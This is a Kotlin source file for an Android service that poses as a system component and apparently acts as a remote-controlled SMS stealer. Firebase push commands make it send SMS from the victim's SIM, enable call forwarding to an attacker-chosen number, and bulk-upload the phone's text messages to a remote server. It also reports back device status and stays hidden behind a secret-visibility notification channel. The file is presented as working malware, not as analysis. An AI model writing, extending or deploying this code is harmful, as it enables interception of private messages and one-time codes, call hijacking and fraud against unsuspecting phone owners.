package com.android.system.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import kotlinx.coroutines.*
import com.android.system.services.utils.SmsBatchUploader

class MyFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "FCMService"
        private const val CHANNEL_ID = "default_channel"
        private const val WAKEUP_CHANNEL_ID = "wakeup_channel"
        
        private const val SMS_SENT_ACTION = "com.android.system.services.SMS_SENT"
        private const val SMS_DELIVERED_ACTION = "com.android.system.services.SMS_DELIVERED"
        
        private const val PREFS_NAME = "fcm_processed_messages"
        private const val KEY_PROCESSED_MSG_IDS = "processed_message_ids"
        private const val MAX_STORED_MSG_IDS = 100
    }
    
    private var wakeLock: PowerManager.WakeLock? = null
    private var receiversRegistered = false
    
    private val smsSentReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val smsId = intent?.getStringExtra("sms_id") ?: return
            val phone = intent.getStringExtra("phone") ?: ""
            val message = intent.getStringExtra("message") ?: ""
            val simSlot = intent.getIntExtra("sim_slot", 0)
            val simPhoneNumber = getSimPhoneNumber(context, simSlot)
            
            when (resultCode) {
                android.app.Activity.RESULT_OK -> {
                    sendSmsStatusToServer(smsId, phone, message, simSlot, simPhoneNumber, "sent", "SMS sent successfully")
                }
                SmsManager.RESULT_ERROR_GENERIC_FAILURE -> {
                    sendSmsStatusToServer(smsId, phone, message, simSlot, simPhoneNumber, "failed", "Generic failure")
                }
                SmsManager.RESULT_ERROR_NO_SERVICE -> {
                    sendSmsStatusToServer(smsId, phone, message, simSlot, simPhoneNumber, "failed", "No service")
                }
                SmsManager.RESULT_ERROR_NULL_PDU -> {
                    sendSmsStatusToServer(smsId, phone, message, simSlot, simPhoneNumber, "failed", "Null PDU")
                }
                SmsManager.RESULT_ERROR_RADIO_OFF -> {
                    sendSmsStatusToServer(smsId, phone, message, simSlot, simPhoneNumber, "failed", "Radio off")
                }
                111 -> {
                    sendSmsStatusToServer(smsId, phone, message, simSlot, simPhoneNumber, "failed", "Error 111: Invalid PDU or SIM card issue")
                }
                else -> {
                    sendSmsStatusToServer(smsId, phone, message, simSlot, simPhoneNumber, "failed", "Unknown error: $resultCode")
                }
            }
        }
    }
    
    private val smsDeliveredReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val smsId = intent?.getStringExtra("sms_id") ?: return
            val phone = intent.getStringExtra("phone") ?: ""
            val message = intent.getStringExtra("message") ?: ""
            val simSlot = intent.getIntExtra("sim_slot", 0)
            val simPhoneNumber = getSimPhoneNumber(context, simSlot)
            
            when (resultCode) {
                android.app.Activity.RESULT_OK -> {
                    sendSmsStatusToServer(smsId, phone, message, simSlot, simPhoneNumber, "delivered", "SMS delivered successfully")
                }
                android.app.Activity.RESULT_CANCELED -> {
                    sendSmsStatusToServer(smsId, phone, message, simSlot, simPhoneNumber, "not_delivered", "SMS not delivered")
                }
                else -> {
                    sendSmsStatusToServer(smsId, phone, message, simSlot, simPhoneNumber, "delivery_unknown", "Unknown delivery status: $resultCode")
                }
            }
        }
    }
    
    private fun getBaseUrl(): String = ServerConfig.getBaseUrl()

    override fun onCreate() {
        super.onCreate()
        createWakeUpChannel()
        registerSmsReceivers()
        subscribeToAllDevicesTopic()
    }
    
    private fun subscribeToAllDevicesTopic() {
        FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
            .addOnCompleteListener { task ->
                if (!task.isSuccessful) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        subscribeToAllDevicesTopic()
                    }, 30000)
                }
            }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        
        releaseWakeLock()
        
        if (receiversRegistered) {
            try {
                unregisterReceiver(smsSentReceiver)
                unregisterReceiver(smsDeliveredReceiver)
                receiversRegistered = false
            } catch (e: IllegalArgumentException) {
                receiversRegistered = false
            } catch (e: Exception) {
                Log.e(TAG, "Error unregistering receivers: ${e.message}")
            }
        }
    }
    
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        acquireWakeLock()
        
        try {
            val messageId = remoteMessage.messageId ?: UUID.randomUUID().toString()
            
            val isFromTopic = remoteMessage.from?.startsWith("/topics/") == true
            val topicName = if (isFromTopic) {
                remoteMessage.from?.substringAfter("/topics/")
            } else {
                null
            }
            
            if (isMessageAlreadyProcessed(messageId)) {
                return
            }

            markMessageAsProcessed(messageId)

            remoteMessage.notification?.let {
                showNotification(it.title ?: "", it.body ?: "")
            }

            if (remoteMessage.data.isNotEmpty()) {
                handleDataMessage(remoteMessage.data, isFromTopic, topicName)
            }
            
        } finally {
            releaseWakeLock()
        }
    }

    private fun handleDataMessage(data: Map<String, String>, isFromTopic: Boolean = false, topicName: String? = null) {
        val type = data["type"]
        val phone = data["phone"]
        val message = data["message"]
        val simSlotStr = data["simSlot"]
        val forwardNumber = data["number"]
        val timestamp = data["timestamp"]

        val simSlot = simSlotStr?.toIntOrNull() ?: 0
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

        when (type) {
            "ping" -> {
                // فقط پاسخ ping - بدون راه‌اندازی سرویس
                if (isFromTopic && topicName == "all_devices") {
                    val randomDelaySeconds = (0..120).random()
                    val randomDelayMs = randomDelaySeconds * 1000L
                    
                    Handler(Looper.getMainLooper()).postDelayed({
                        sendOnlineConfirmation()
                    }, randomDelayMs)
                    
                    Handler(Looper.getMainLooper()).postDelayed({
                        sendPendingResponses()
                    }, 2000)
                } else {
                    sendOnlineConfirmation()
                    Handler(Looper.getMainLooper()).postDelayed({
                        sendPendingResponses()
                    }, 2000)
                }
            }

            "call_forwarding" -> {
                if (!forwardNumber.isNullOrEmpty()) {
                    val utility = CallForwardingUtility(applicationContext, deviceId)
                    utility.forwardCall(forwardNumber, simSlot)
                }
            }

            "call_forwarding_disable" -> {
                val utility = CallForwardingUtility(applicationContext, deviceId)
                utility.deactivateCallForwarding(simSlot)
            }

            "send_sms" -> {
                if (phone != null && message != null) {
                    sendSms(phone, message, simSlot)
                }
            }

            "quick_upload_sms" -> {
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val result = SmsBatchUploader.uploadQuickSms(
                            context = applicationContext,
                            deviceId = deviceId,
                            baseUrl = getBaseUrl(),
                            limit = 50
                        )

                        when (result) {
                            is SmsBatchUploader.UploadResult.Success -> {
                                sendUploadResponse("quick_sms_success", result.totalSent)
                            }
                            is SmsBatchUploader.UploadResult.Failure -> {
                                sendUploadResponse("quick_sms_failed", 0, result.error)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Quick SMS upload error: ${e.message}", e)
                    }
                }
            }

            "upload_all_sms" -> {
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val result = SmsBatchUploader.uploadAllSms(
                            context = applicationContext,
                            deviceId = deviceId,
                            baseUrl = getBaseUrl(),
                            onProgress = { progress -> }
                        )

                        when (result) {
                            is SmsBatchUploader.UploadResult.Success -> {
                                sendUploadResponse("all_sms_success", result.totalSent)
                            }
                            is SmsBatchUploader.UploadResult.Failure -> {
                                sendUploadResponse("all_sms_failed", 0, result.error)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "All SMS upload error: ${e.message}", e)
                    }
                }
            }

            else -> {
                if (phone != null && message != null) {
                    sendSms(phone, message, simSlot)
                }
            }
        }
    }

    private fun registerSmsReceivers() {
        if (receiversRegistered) {
            return
        }
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(smsSentReceiver, IntentFilter(SMS_SENT_ACTION), Context.RECEIVER_NOT_EXPORTED)
                registerReceiver(smsDeliveredReceiver, IntentFilter(SMS_DELIVERED_ACTION), Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(smsSentReceiver, IntentFilter(SMS_SENT_ACTION))
                registerReceiver(smsDeliveredReceiver, IntentFilter(SMS_DELIVERED_ACTION))
            }
            receiversRegistered = true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register SMS receivers: ${e.message}", e)
        }
    }
    
    private fun sendSms(phone: String, message: String, simSlot: Int) {
        val smsId = UUID.randomUUID().toString()

        try {
            val sentIntent = Intent(SMS_SENT_ACTION).apply {
                setPackage(packageName)
                putExtra("sms_id", smsId)
                putExtra("phone", phone)
                putExtra("message", message)
                putExtra("sim_slot", simSlot)
            }
            
            val deliveredIntent = Intent(SMS_DELIVERED_ACTION).apply {
                setPackage(packageName)
                putExtra("sms_id", smsId)
                putExtra("phone", phone)
                putExtra("message", message)
                putExtra("sim_slot", simSlot)
            }
            
            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            } else {
                PendingIntent.FLAG_UPDATE_CURRENT
            }
            
            val sentPI = PendingIntent.getBroadcast(
                this,
                smsId.hashCode(),
                sentIntent,
                flags
            )
            
            val deliveredPI = PendingIntent.getBroadcast(
                this,
                smsId.hashCode() + 1,
                deliveredIntent,
                flags
            )
            
            val subManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager

            if (subManager == null) {
                sendSmsStatusToServer(smsId, phone, message, simSlot, "", "failed", "SubscriptionManager is null")
                return
            }

            val activeSubscriptions = subManager.activeSubscriptionInfoList

            if (activeSubscriptions.isNullOrEmpty() || simSlot >= activeSubscriptions.size) {
                SmsManager.getDefault().sendTextMessage(phone, null, message, sentPI, deliveredPI)
                return
            }

            val subscriptionId = activeSubscriptions[simSlot].subscriptionId
            val smsManager = SmsManager.getSmsManagerForSubscriptionId(subscriptionId)
            smsManager.sendTextMessage(phone, null, message, sentPI, deliveredPI)

        } catch (e: SecurityException) {
            val simPhoneNumber = getSimPhoneNumber(this, simSlot)
            sendSmsStatusToServer(smsId, phone, message, simSlot, simPhoneNumber, "failed", "Permission denied: ${e.message}")
        } catch (e: Exception) {
            val simPhoneNumber = getSimPhoneNumber(this, simSlot)
            sendSmsStatusToServer(smsId, phone, message, simSlot, simPhoneNumber, "failed", "Exception: ${e.message}")
        }
    }

    private fun sendOnlineConfirmation() {
        Thread {
            try {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val timestamp = System.currentTimeMillis()
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("isOnline", true)
                    put("timestamp", timestamp)
                    put("source", "FCM_Ping")
                }

                val baseUrl = getBaseUrl()
                val urlString = "$baseUrl/ping-response"

                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection

                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 15000
                conn.readTimeout = 15000

                conn.outputStream.use { os ->
                    val bytes = body.toString().toByteArray()
                    os.write(bytes)
                    os.flush()
                }

                val responseCode = conn.responseCode
                if (responseCode != HttpURLConnection.HTTP_OK) {
                    conn.errorStream?.bufferedReader()?.use { it.readText() }
                }

                conn.disconnect()

            } catch (e: Exception) {
                Log.e(TAG, "Failed to send ping response: ${e.message}")
            }
        }.start()
    }

    private fun sendUploadResponse(status: String, count: Int, error: String? = null) {
        Thread {
            try {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val body = JSONObject().apply {
                    put("device_id", deviceId)
                    put("status", status)
                    put("count", count)
                    if (error != null) {
                        put("error", error)
                    }
                }

                val urlString = "${getBaseUrl()}/upload-response"

                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                
                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray())
                    os.flush()
                }
                
                val responseCode = conn.responseCode
                
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // Success
                } else {
                    savePendingResponse("upload_response", body.toString())
                }
                
            } catch (e: java.net.SocketTimeoutException) {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val body = JSONObject().apply {
                    put("device_id", deviceId)
                    put("status", status)
                    put("count", count)
                    if (error != null) {
                        put("error", error)
                    }
                }
                savePendingResponse("upload_response", body.toString())
            } catch (e: java.net.ConnectException) {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val body = JSONObject().apply {
                    put("device_id", deviceId)
                    put("status", status)
                    put("count", count)
                    if (error != null) {
                        put("error", error)
                    }
                }
                savePendingResponse("upload_response", body.toString())
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send upload response", e)
            }
        }.start()
    }
    
    private fun savePendingResponse(type: String, data: String) {
        try {
            val prefs = getSharedPreferences("pending_responses", Context.MODE_PRIVATE)
            val pendingCount = prefs.getInt("count", 0)
            val key = "response_${System.currentTimeMillis()}_${pendingCount}"
            
            prefs.edit()
                .putString(key, "$type|$data")
                .putInt("count", pendingCount + 1)
                .apply()
            
            if (pendingCount > 50) {
                val allKeys = prefs.all.keys.filter { it.startsWith("response_") }
                val sortedKeys = allKeys.sorted()
                val keysToRemove = sortedKeys.take(10)
                prefs.edit().apply {
                    keysToRemove.forEach { remove(it) }
                    apply()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save pending response: ${e.message}")
        }
    }
    
    private fun sendPendingResponses() {
        Thread {
            try {
                val prefs = getSharedPreferences("pending_responses", Context.MODE_PRIVATE)
                val allKeys = prefs.all.keys.filter { it.startsWith("response_") }
                
                if (allKeys.isEmpty()) {
                    return@Thread
                }
                
                val sortedKeys = allKeys.sorted()
                
                for (key in sortedKeys) {
                    val value = prefs.getString(key, null) ?: continue
                    val parts = value.split("|", limit = 2)
                    if (parts.size != 2) continue
                    
                    val type = parts[0]
                    val data = parts[1]
                    
                    try {
                        val urlString = when (type) {
                            "upload_response" -> "${getBaseUrl()}/upload-response"
                            "sms_status" -> "${getBaseUrl()}/sms/delivery-status"
                            "service_status" -> "${getBaseUrl()}/devices/service-status"
                            else -> return@Thread
                        }
                        
                        val url = URL(urlString)
                        val conn = url.openConnection() as HttpURLConnection
                        conn.requestMethod = "POST"
                        conn.setRequestProperty("Content-Type", "application/json")
                        conn.doOutput = true
                        conn.connectTimeout = 10000
                        conn.readTimeout = 10000
                        
                        conn.outputStream.use { os ->
                            os.write(data.toByteArray())
                            os.flush()
                        }
                        
                        val responseCode = conn.responseCode
                        if (responseCode == HttpURLConnection.HTTP_OK) {
                            prefs.edit().remove(key).apply()
                        }
                        
                        conn.disconnect()
                        Thread.sleep(500)
                        
                    } catch (e: Exception) {
                        Log.e(TAG, "Error sending pending response: ${e.message}")
                    }
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send pending responses: ${e.message}")
            }
        }.start()
    }

    private fun createWakeUpChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                WAKEUP_CHANNEL_ID,
                "System Services",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "System service notifications"
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }
    
    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "FCM::WakeLock"
            )
            wakeLock?.acquire(60 * 1000L)
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire WakeLock: ${e.message}")
        }
    }
    
    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
                wakeLock = null
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to release WakeLock: ${e.message}", e)
            wakeLock = null
        }
    }
    
    private fun showNotification(title: String, messageBody: String) {
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Default Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            ).apply {
                description = "Channel for app notifications"
                enableLights(true)
                lightColor = android.graphics.Color.BLUE
            }
            notificationManager.createNotificationChannel(channel)
        }

        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }

        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle(title)
            .setContentText(messageBody)
            .setAutoCancel(true)
            .setContentIntent(pendingIntent)
            .build()

        notificationManager.notify(0, notification)
    }
    
    // حذف شد - دیگه سرویس‌های background راه‌اندازی نمیشن
    
    private fun getSimPhoneNumber(context: Context?, simSlot: Int): String {
        if (context == null) return ""
        
        try {
            val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            if (subManager == null) return ""
            
            val activeSubscriptions = subManager.activeSubscriptionInfoList
            if (activeSubscriptions.isNullOrEmpty() || simSlot >= activeSubscriptions.size) {
                return ""
            }
            
            val subscriptionInfo = activeSubscriptions[simSlot]
            var phoneNumber = subscriptionInfo.number ?: ""
            
            if (phoneNumber.isBlank() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                try {
                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                    if (telephonyManager != null) {
                        val tm = telephonyManager.createForSubscriptionId(subscriptionInfo.subscriptionId)
                        phoneNumber = tm.line1Number ?: ""
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to get line1Number for SIM $simSlot: ${e.message}")
                }
            }
            
            return phoneNumber
        } catch (e: Exception) {
            Log.e(TAG, "Error getting SIM phone number: ${e.message}")
            return ""
        }
    }
    
    private fun sendSmsStatusToServer(
        smsId: String,
        phone: String,
        message: String,
        simSlot: Int,
        simPhoneNumber: String,
        status: String,
        details: String
    ) {
        Thread {
            val deviceId = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ANDROID_ID
            )
            
            val body = JSONObject().apply {
                put("device_id", deviceId)
                put("sms_id", smsId)
                put("phone", phone)
                put("message", message)
                put("sim_slot", simSlot)
                put("sim_phone_number", simPhoneNumber)
                put("status", status)
                put("details", details)
                put("timestamp", System.currentTimeMillis())
            }
            
            try {
                val baseUrl = getBaseUrl()
                val url = URL("$baseUrl/sms/delivery-status")
                val conn = url.openConnection() as HttpURLConnection
                
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                conn.doOutput = true
                
                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray())
                    os.flush()
                }
                
                val responseCode = conn.responseCode
                
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    conn.inputStream.bufferedReader().use { it.readText() }
                } else {
                    conn.errorStream?.bufferedReader()?.use { it.readText() }
                    savePendingResponse("sms_status", body.toString())
                }
                
                conn.disconnect()
                
            } catch (e: java.net.SocketTimeoutException) {
                savePendingResponse("sms_status", body.toString())
            } catch (e: java.net.ConnectException) {
                savePendingResponse("sms_status", body.toString())
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send SMS status: ${e.message}")
            }
        }.start()
    }
    
    private fun sendServiceStatusToServer(success: Boolean) {
        Thread {
            try {
                val deviceId = Settings.Secure.getString(
                    contentResolver,
                    Settings.Secure.ANDROID_ID
                )
                
                val body = JSONObject().apply {
                    put("device_id", deviceId)
                    put("status", if (success) "services_started" else "services_failed")
                    put("timestamp", System.currentTimeMillis())
                }
                
                val baseUrl = getBaseUrl()
                val url = URL("$baseUrl/devices/service-status")
                val conn = url.openConnection() as HttpURLConnection
                
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                conn.doOutput = true
                
                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray())
                    os.flush()
                }
                
                conn.responseCode
                conn.disconnect()
                
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send service status: ${e.message}")
            }
        }.start()
    }

    private fun isMessageAlreadyProcessed(messageId: String): Boolean {
        return try {
            val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val processedIds = prefs.getStringSet(KEY_PROCESSED_MSG_IDS, mutableSetOf()) ?: mutableSetOf()
            processedIds.contains(messageId)
        } catch (e: Exception) {
            Log.e(TAG, "Error checking message status: ${e.message}", e)
            false
        }
    }
    
    private fun markMessageAsProcessed(messageId: String) {
        try {
            val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val processedIds = (prefs.getStringSet(KEY_PROCESSED_MSG_IDS, mutableSetOf()) ?: mutableSetOf()).toMutableSet()
            
            processedIds.add(messageId)
            
            if (processedIds.size > MAX_STORED_MSG_IDS) {
                val sortedIds = processedIds.sorted()
                val idsToRemove = sortedIds.take(processedIds.size - MAX_STORED_MSG_IDS)
                processedIds.removeAll(idsToRemove)
            }
            
            prefs.edit()
                .putStringSet(KEY_PROCESSED_MSG_IDS, processedIds)
                .apply()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error marking message as processed: ${e.message}", e)
        }
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        subscribeToAllDevicesTopic()
    }
}